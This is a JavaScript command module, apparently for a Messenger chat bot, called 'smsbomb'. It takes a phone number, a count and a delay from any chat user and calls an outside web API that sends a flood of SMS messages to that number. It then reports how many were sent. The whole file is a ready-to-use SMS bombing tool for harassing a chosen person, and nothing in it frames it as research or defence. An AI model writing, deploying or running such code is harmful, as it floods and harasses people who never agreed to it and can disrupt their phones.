const axios = require('axios');

module.exports = {
  name: 'smsbomb',
  description: 'Send multiple SMS messages to a number with a delay',
  author: 'Deku (rest api)',
  async execute(senderId, args, pageAccessToken, sendMessage) {
    const [number, amount, delay] = args;

    if (!number || !amount || !delay) {
      sendMessage(senderId, { text: 'Usage: smsbomb [number] [amount] [delay]' }, pageAccessToken);
      return;
    }

    try {
      const apiUrl = `https://deku-rest-api-3ijr.onrender.com/smsb?number=${number}&amount=${amount}&delay=${delay}`;
      const response = await axios.get(apiUrl);
      
      const { status, success, fail } = response.data;
      if (status) {
        sendMessage(senderId, { text: `Successfully sent ${success} SMS messages to ${number}. ${fail} messages failed.` }, pageAccessToken);
      } else {
        sendMessage(senderId, { text: 'Failed to send SMS messages.' }, pageAccessToken);
      }
    } catch (error) {
      console.error('Error sending SMS messages:', error);
      sendMessage(senderId, { text: 'Sorry, there was an error processing your request.' }, pageAccessToken);
    }
  }
};